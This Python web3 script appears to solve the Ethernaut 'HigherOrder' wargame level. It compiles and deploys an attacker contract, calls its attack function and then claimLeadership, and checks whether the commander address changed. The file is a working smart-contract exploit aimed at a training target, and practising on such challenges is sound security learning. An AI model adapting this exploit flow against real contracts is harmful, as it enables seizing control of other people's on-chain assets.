from web3 import Web3
from solcx import compile_source
from dotenv import dotenv_values

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x09601fBa6C50825Ff4A95112008311e21f3f24d9'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL30_ADDRESS']
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "function",
        "name": "claimLeadership",
        "inputs": [],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0x5b3e8fe7"
    },
    {
        "type": "function",
        "name": "commander",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x37270936"
    },
    {
        "type": "function",
        "name": "registerTreasury",
        "inputs": [
            {
                "name": "",
                "type": "uint8",
                "internalType": "uint8"
            }
        ],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0x211c85ab"
    },
    {
        "type": "function",
        "name": "treasury",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x61d027b3"
    }
]

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

with open("./contract/HigherOrderAttack.sol", "r") as f:
    ATTACKER_SRC_DATA = f.read()

COMPILED_SOL = compile_source(ATTACKER_SRC_DATA, optimize=False, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

ATTACKER_BYTECODE = contract_interface['bin']
ATTACKER_ABI = contract_interface['abi']

attacker = web3.eth.contract(abi=ATTACKER_ABI, bytecode=ATTACKER_BYTECODE)

tx_hash = attacker.constructor(CONTRACT_ADDRESS).transact()

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

ATTACKER_ADDRESS = receipt.contractAddress

attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)

print("---- BEFORE TRNASACTION ----")

BEFORE_COMMANDER = contract.functions.commander().call()
BEFORE_TREASURY = contract.functions.treasury().call()

print(f"Commander address : {BEFORE_COMMANDER}")
print(f"Treasury : {BEFORE_TREASURY}\n")

data = {
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = attacker.functions.attack().build_transaction(data)

signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

data = {
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = contract.functions.claimLeadership().build_transaction(data)

signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

print("---- AFTER TRNASACTION ----")

AFTER_COMMANDER = contract.functions.commander().call()
AFTER_TREASURY = contract.functions.treasury().call()

print(f"Commander address : {AFTER_COMMANDER}")
print(f"Treasury : {hex(AFTER_TREASURY)}\n")

if BEFORE_COMMANDER != AFTER_COMMANDER:
    print("ATTACK SUCCESS!")
else:
    print("ATTACK FAILED...")